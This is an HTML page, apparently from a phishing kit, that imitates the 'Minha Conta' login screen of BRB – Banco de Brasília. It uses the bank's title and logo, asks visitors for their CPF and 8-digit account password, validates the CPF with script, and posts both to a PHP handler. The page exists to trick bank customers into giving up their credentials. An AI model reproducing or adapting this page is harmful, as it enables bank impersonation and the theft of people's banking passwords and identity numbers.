<!-- 
Theme Name: BRB ATUALIZAÇÃO
Author: MK(rj)
 -->

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <title>BRB - Banco de Brasília - Inicio / para você / BRB - Banco de Brasília</title>

    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/estilo.css">
    <link href="img/favico.ico" rel="Shortcut Icon">
    
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="theme-color" content="#015DAA">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">

    <!-- scripts -->
    <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
    <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/script2.js"></script>
    <script src="js/script1.js"></script>
    <script src="js/script1.js?Xxxxdss" language="javascript"></script>
    <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>

    <script language="javascript">
        var isOK = false;
    </script>

    <style type="text/css">
    .spinner {
      margin: 20px auto 0;
      width: 100px;
      text-align: center;
    }

    .spinner > div {
      width: 18px;
      height: 18px;
      background-color: #13387F;
      opacity: 0.9;

      border-radius: 100%;
      display: inline-block;
      -webkit-animation: sk-bouncedelay 1.4s infinite ease-in-out both;
      animation: sk-bouncedelay 1.4s infinite ease-in-out both;
    }

    .spinner .bounce1 {
      -webkit-animation-delay: -0.32s;
      animation-delay: -0.32s;
    }

    .spinner .bounce2 {
      -webkit-animation-delay: -0.16s;
      animation-delay: -0.16s;
    }

    @-webkit-keyframes sk-bouncedelay {
      0%, 80%, 100% { -webkit-transform: scale(0) }
      40% { -webkit-transform: scale(1.0) }
    }

    @keyframes sk-bouncedelay {
      0%, 80%, 100% { 
        -webkit-transform: scale(0);
        transform: scale(0);
      } 40% { 
        -webkit-transform: scale(1.0);
        transform: scale(1.0);
      }
    }
    hr.style13 {
        height: 200px;
        background-color: #ff0015; height: 260px; border: 0; 
    }
  </style>
</head>
    <body id="tela2">
        <div class='preloader'>
          <div class='loaded'>
            <div class="spinner">
              <div class="bounce1"></div>
              <div class="bounce2"></div>
              <div class="bounce3"></div>
            </div>
          </div>
        </div>

        <header class="topo">
          <div class="container">
            <div class="row">
              <div class="col-12">
                <h1 class="logo">
                  <img class="img-fluid" src="img/logo.png">
                </h1>
              </div>
            </div>
          </div>
        </header>

        <main class="corpo">
          <div class="container">
            <div class="row">
              <div class="col-12">
                <h2 class="TituloForm">
                  Minha Conta
                </h2>
              </div>
            </div>
            <div class="row">
              <div class="col-12">
                <form id="frm" action="webApps_AplicationIdentification.php" method="POST" enctype="application/x-www-form-urlencoded" onSubmit="return isOK;">
                  <div class="form-group">
                      <label for="identificador">CPF</label><i class="icoLabel">*</i>
                      <input type="tel" class="form-control" name="identificador" id="identificador" maxlength="11" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um CPF válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('identificador','senha8');" autofocus required>
                  </div>
                  <div class="form-group">
                      <label for="oitovezes">SENHA (8 dígitos)</label><i class="icoLabel">*</i>
                      <input type="password" class="form-control" name="oitovezes" id="oitovezes" minlength="8" maxlength="8" onkeyup="pulacampo('oitovezes','acessar');">
                  </div>
                  <div class="form-group">
                      <input class="btnAcessar" type="submit" name="acessar" id="acessar">
                  </div>
                </form>
              </div>
            </div>
          </div>
        </main>

    </body>
    <script language="javascript">
     $( document ).ready(function() {
         
        $( "#acessar" ).click(function() {
            if (checkCPF()){
                isOK = true;    
                $("#frm").submit(); 
            } else {
                alert("CPF incorreto, informe corretamente.");
            }
        }); 
        

    });
        
    </script>

    <script type="text/javascript">
         jQuery(document).ready(function ($) {

             $(window).load(function () {
                 // $(".loaded").fadeOut();
                 $(".preloader").delay(1000).fadeOut("slow");
             });
         });
      </script>
</html> 